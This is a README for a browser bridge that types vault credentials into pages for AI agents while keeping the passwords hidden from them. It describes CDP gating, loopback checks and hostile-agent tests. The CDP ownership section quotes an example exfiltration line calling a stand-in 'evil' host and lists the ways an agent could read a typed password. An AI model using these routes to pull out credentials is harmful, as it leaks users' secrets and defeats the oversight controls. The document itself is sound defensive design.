# 1Claw Browser Bridge

Governed credential fill for AI agents. The agent drives the browser; it never
sees the password.

> **Status: v0.1, private.**
>
> **Built:** the `VaultBackend` trait, `SecretHandle`, the saas driver, the CDP
> allowlist gate, the loopback checks, the Chromium pipe transport (`spawn` with
> fds 3/4 under `--remote-debugging-pipe`), the proxy socket, and the MCP
> toolset. 156 tests here, plus the vault half.
>
> **Not built:** the community driver — see [Roadmap](#roadmap).
>
> **The server side is implemented**, end to end:
>
> | Route | Who may call it | What it does |
> | --- | --- | --- |
> | `POST /v1/browser/devices` | a human, behind a step-up re-auth | pins the device key and mints the `bb_` credential, once |
> | `POST /v1/agents/{id}/browser/sessions` | the human's token **+** `bb_` | opens a session, returns a `bs_` token |
> | `POST /v1/agents/{id}/browser/fills` | the agent's JWT **+** `bb_` **+** `bs_` | checks tab, frame and form-action origins against the binding, applies the velocity cap, records a single-use grant |
> | `POST /v1/agents/{id}/browser/fills/consume` | the human's token **+** `bb_` **+** `bs_`, and **not** an agent | spends the grant and returns the credential |
>
> The split on the last two rows is the invariant in the routing table: the
> agent asks *which* binding, and is refused when it tries to collect the
> answer. There is no feature flag — the endpoints had no implementation
> behind them, which is a different thing from being switched off.
>
> **Going public** requires the adversarial suite green on every shipped driver.
> Only the saas driver ships today, so that is the bar it has to clear — the
> community driver raises the bar rather than delays it.
>
> That suite is `adversarial.test.ts`: it drives `startBridge`, the entry point
> a real deployment uses, and plays the agent as hostile rather than careless.
> Each of its tests is checked by breaking the control it covers and confirming
> it goes red, because a green suite is evidence about the tests as much as the
> code. In August 2026 the per-file suites passed 121/121 while three controls
> did nothing: the fill window never fired (commands were matched on
> `params.targetId`, which CDP does not use for the methods that read a form
> field), every client received every other client's events, and a listener
> installed before a fill could read the credential typed during it. Every
> component was individually correct; all three bugs were in the seams.
>
> A fourth of the same shape was found writing the suite and is fixed here: the
> TOCTOU generation was bumped under a CDP *session* id and read under a
> *target* id, so the two counters never met and a grant survived the navigation
> it existed to be invalidated by.

## The invariant

**No backend can return a secret through a tool result.** `consumeFill()`
yields a `SecretHandle` — zeroised on disposal, and hostile to every path a
string would take out of the process:

| Path | Behaviour |
| --- | --- |
| `JSON.stringify` | **throws** — this is the MCP result path, so a handle reaching it is a broken control, not a formatting problem |
| `String()`, `` `${h}` ``, `.toString()` | redacted |
| `util.inspect` / `console.log` | redacted |
| `Object.keys` / spread | empty — the bytes are a true private field |
| after `dispose()` | buffer overwritten with zeros; all reads throw |

JavaScript has no destructors, so "zeroise on drop" is explicit: use `using`
(`Symbol.dispose`) or `handle.use(fn)`, which disposes even when `fn` throws —
the failure path being exactly where a live secret tends to get left behind.

## Architecture

The security rules live in the **core** and behave identically on every
backend: origin and frame checks, TOCTOU generation binding, the CDP fill
window, buffer zeroing, velocity limiting.

Drivers own four things and no others: where secrets live, who evaluates
policy, where audit goes, and which capabilities exist.

That split is what makes the invariant reviewable once instead of once per
driver — and it is enforced, not merely intended:
`core-has-no-driver-conditionals.test.ts` fails the build if the core ever
names a driver in code.

```
packages/protocol   wire types shared with the (closed) vault handlers
packages/browser-bridge
  secret-handle.ts  the invariant, as a class
  vault-backend.ts  the trait every driver implements + capability→tool map
  cdp-policy.ts     what an agent's CDP connection may do
  cdp-proxy.ts      the only route from a framework to Chromium
  cdp-transport.ts  the bridge's own connection, behind an interface
  pipe-transport.ts CDP over --remote-debugging-pipe (never a port)
  pipe-codec.ts     NUL-delimited framing, buffered across chunks
  proxy-server.ts   the socket a framework points cdp_url at
  mcp-tools.ts      the status-only tool surface an agent calls
  fill-engine.ts    where every other control is cashed in
  loopback.ts       who may reach the local listeners
  drivers/saas.ts   1Claw-hosted backend
```

### CDP ownership

The bridge is the **only** process attached to Chromium; frameworks reach it
through a gate. If an agent keeps its own CDP connection to the same browser
the bridge types into, the invariant fails in one step — after a fill it reads
`input.value`, the a11y tree, a screenshot, or the `Network` log of the POST.

Filtering responses does not fix that, which is why this gates commands and
events rather than redacting: `btoa(input.value)` and
`fetch('https://evil/?'+v)` never return the value to the agent at all.

It is an **allowlist**. CDP has ~50 domains and gains members every Chromium
release; a denylist is stale the day it is written, and its failure mode is
silent exposure. During a fill the *whole target* is blocked, not just the
field, and push events on it are dropped rather than queued — replaying them
afterwards would hand over exactly what suppression prevented.

### Setup

Pair the machine once — a human step, and deliberately so, since the device
being paired is the one that will type secrets into pages:

```bash
curl -sX POST https://api.1claw.co/v1/browser/devices \
  -H "authorization: Bearer $ONECLAW_TOKEN" \
  -d '{"label":"my-laptop","public_key_pin":"<device key>"}'
```

The `bb_` credential comes back once. Then:

```bash
export ONECLAW_BRIDGE_CREDENTIAL=bb_…   # this machine
export ONECLAW_TOKEN=…                  # you
export ONECLAW_AGENT_TOKEN=…            # the agent
export ONECLAW_AGENT_ID=…
1claw-browser-bridge --chrome /path/to/chrome
```

Three credentials because the vault requires three distinct facts — which
machine, which person, which agent — and collapsing any two would let one stand
in for another. The bridge refuses to start with any of them missing rather than
failing on the first fill.

Point your framework's `cdp_url` at the URL the bridge prints. Every command
crosses the gate; nothing else is attached to Chromium.

### Loopback

`127.0.0.1` is not a boundary: every page in the browser being driven can reach
it. Any request carrying an `Origin` is refused — not just cross-site ones,
because localhost-to-localhost is *same*-site and `Sec-Fetch-Site` would pass
it. Plus a literal-loopback `Host` check for DNS rebinding, and a per-session
token compared in constant time.

### The agent's surface

`request_fill` asks the bridge to type a credential. It does not return one —
the agent learns whether the fill happened, never what was typed. There is
deliberately no tool that returns credential material, because a tool that
could would be the shortest path around everything else here.

Its schema takes a `binding_id` and nothing else. No url, because the bridge
navigates to the binding's own `login_url` rather than letting an agent choose
which page receives the credential. No value, because the agent never supplies
the secret. Page state is observed by the bridge, not accepted as an argument.

Denials come back as a closed-set reason. Free text would reach an agent that
will try to argue with it, and risks naming which credential exists.

### Ordering, in the fill engine

The sequence is the design, not a style:

1. **Block the agent first**, before the secret exists in this process — doing
   it after leaves a gap where the agent can watch the typing it is about to be
   blocked from watching.
2. **Navigate to the binding's own `login_url`.** An agent that picks the URL
   picks who receives the password.
3. **Re-check the generation immediately before typing.** Authorisation
   happened earlier; if the page moved since, the credential lands in whatever
   loaded instead. The TOCTOU gap is closed at the last moment, not the first.
4. **Type from the handle, then dispose.**
5. **Close the window in `finally`** — the failure path is exactly where a
   half-open window would persist and lock the agent out of its own browser.

Each step is pinned by a test that a mutation confirms bites.

### Capability gating

Tools are **absent**, not disabled. A tool that exists and always fails teaches
an agent to retry, and puts a runtime upsell in agent-visible output. On the
community backend `request_checkout` is simply not registered.

## Develop

```bash
pnpm install
pnpm typecheck     # tsc -b across the workspace
pnpm test          # vitest
pnpm ci            # both, as CI runs them
```

The suite includes mutation-verified guards. Each of these fails a specific
test rather than passing quietly: making `toJSON` return plaintext, removing
the buffer zeroing, adding `if (backend === "saas")` to the core, letting the
CDP gate allow unknown methods, not blocking the target during a fill, and
rejecting only cross-site `Origin`s.

## Roadmap

- **v0.1** (here) — `VaultBackend` + `SecretHandle` + saas driver + CDP allowlist gate + loopback checks + Chromium pipe transport + per-client `BrowserContext` + MCP stdio + the composition root and `1claw-browser-bridge` bin. Vault side: pairing, sessions, fill authorisation and grant consumption.
- **OSS launch** — the gate is the adversarial harness passing against the saas driver, plus: community driver, form action + fingerprint checks, mock-vault, and the vault handlers enabled behind a flag so the client can be exercised end to end.
- **v0.2** — governed credential registration, HITL approval queue, TOTP fill
- **v0.3** — cloud-runtime sidecar (platform trust model)

## Security

The threat model, the CDP ownership argument and the adversarial test matrix
live in the 1Claw browser-bridge spec. Report vulnerabilities to
security@1claw.co rather than opening an issue.

Apache-2.0.
